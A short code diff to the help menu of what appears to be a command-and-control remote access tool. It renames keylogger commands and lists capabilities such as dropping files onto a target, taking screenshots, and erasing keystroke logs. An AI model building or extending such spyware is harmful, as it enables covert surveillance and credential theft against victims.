@@ -184,11 +184,11 @@ drop <file> (linux/windows)   :    To infiltrate file from C2 server to trgt
 
 screenshot OR   ss            :    To take screenshot and self destructs the screenshot from trgt
 
-keylog on                     :    To start keylogger
+keylog_on                     :    To start keylogger
 
-keylog dump                   :    To print keystrokes
+keylog_dump                   :    To print keystrokes
 
-keylog off                    :    To close keylogger and self destruct the logged file
+keylog_off                    :    To close keylogger and self destruct the logged file
 ''', 'green'))
 			print(colored('''
 You can also use other commands related to networking, etc for linux as well as windows
